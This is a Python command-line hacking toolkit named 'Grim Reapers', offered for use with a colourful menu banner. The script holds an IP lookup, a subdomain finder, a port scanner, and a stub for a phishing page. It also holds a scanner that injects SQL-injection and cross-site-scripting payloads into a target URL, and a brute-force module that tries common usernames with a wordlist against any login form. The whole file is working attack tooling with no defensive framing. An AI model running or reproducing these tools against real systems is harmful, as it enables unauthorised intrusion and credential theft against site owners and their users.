import os, time, random, requests
from termcolor import colored

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
    text = "Grim Reapers"  # Corrected back to Grim Reapers
    print(colored("=" * (len(text) + 10), random.choice(colors)))
    print(colored(f"=   {text}   =", random.choice(colors)))
    print(colored("=" * (len(text) + 10), random.choice(colors)))
    print(colored("By Lt_Spl4sh\n", random.choice(colors)))
    time.sleep(0.5)

def ip_lookup():
    banner()
    ip = input("Enter IP or domain: ")
    r = requests.get(f"http://ip-api.com/json/{ip}").json()
    for k, v in r.items():
        print(colored(f"{k}: {v}", "cyan"))
    input("\nPress Enter to return...")

def subdomain_finder():
    banner()
    domain = input("Enter domain: ")
    sublist = ['www', 'mail', 'ftp', 'cpanel', 'webmail']
    for sub in sublist:
        url = f"http://{sub}.{domain}"
        try:
            requests.get(url, timeout=3)
            print(colored(f"[+] Found: {url}", "green"))
        except:
            print(colored(f"[-] Not found: {url}", "red"))
    input("\nPress Enter to return...")

def port_scanner():
    import socket
    banner()
    host = input("Enter IP: ")
    ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306]
    for port in ports:
        s = socket.socket()
        s.settimeout(0.5)
        try:
            s.connect((host, port))
            print(colored(f"[+] Port open: {port}", "green"))
        except:
            print(colored(f"[-] Port closed: {port}", "red"))
        s.close()
    input("\nPress Enter to return...")

def phishing_template():
    banner()
    print(colored("[x] This is a placeholder for a phishing module", "yellow"))
    input("\nPress Enter to return...")

def vulnerability_scanner():
    banner()
    url = input("Enter URL to scan: ")
    payloads = ["'", '"', "<script>alert(1)</script>", "OR 1=1"]
    for p in payloads:
        try:
            r = requests.get(url + p)
            if "error" in r.text or "syntax" in r.text or "alert(1)" in r.text:
                print(colored(f"[+] Possible vulnerability with payload: {p}", "green"))
        except:
            pass
    input("\nPress Enter to return...")

def brute_force_login():
    banner()
    url = input("Login URL: ")
    usernames = ['admin', 'user', 'root', 'test']

    print("\nAvailable wordlists:")
    wordlists = [f for f in os.listdir() if f.endswith('.txt')]
    for i, f in enumerate(wordlists):
        print(f"{i+1}. {f}")
    
    try:
        choice = int(input("\nChoose wordlist number: ")) - 1
        passlist_file = wordlists[choice]
    except:
        print(colored("Invalid choice. Exiting brute-force...", "red"))
        return

    try:
        with open(passlist_file, 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
    except:
        print(colored("Error reading file.", "red"))
        return

    session = requests.Session()
    for username in usernames:
        for password in passwords:
            print(colored(f"[x] Trying {username}:{password}", "yellow"))
            payload = {'username': username, 'password': password}
            try:
                r = session.post(url, data=payload, timeout=10)
                if "dashboard" in r.text or "Welcome" in r.text or r.status_code == 302:
                    print(colored(f"[+] Success! {username}:{password}", "green"))
                    return
            except Exception as e:
                print(colored(f"[!] Error: {str(e)}", "magenta"))
    input("\nPress Enter to return...")

while True:
    banner()
    print(colored("1. IP Lookup", "cyan"))
    print(colored("2. Subdomain Finder", "cyan"))
    print(colored("3. Port Scanner", "cyan"))
    print(colored("4. Phishing Page (WIP)", "cyan"))
    print(colored("5. Vulnerability Scanner", "cyan"))
    print(colored("99. Brute-Force Login", "cyan"))
    print(colored("00. Exit", "red"))
    choice = input("\nChoose an option: ")

    if choice == "1":
        ip_lookup()
    elif choice == "2":
        subdomain_finder()
    elif choice == "3":
        port_scanner()
    elif choice == "4":
        phishing_template()
    elif choice == "5":
        vulnerability_scanner()
    elif choice == "99":
        brute_force_login()
    elif choice == "00":
        print(colored("Exiting Grim Reapers...", "red"))
        break
    else:
        print(colored("Invalid choice.", "red"))
        time.sleep(1)
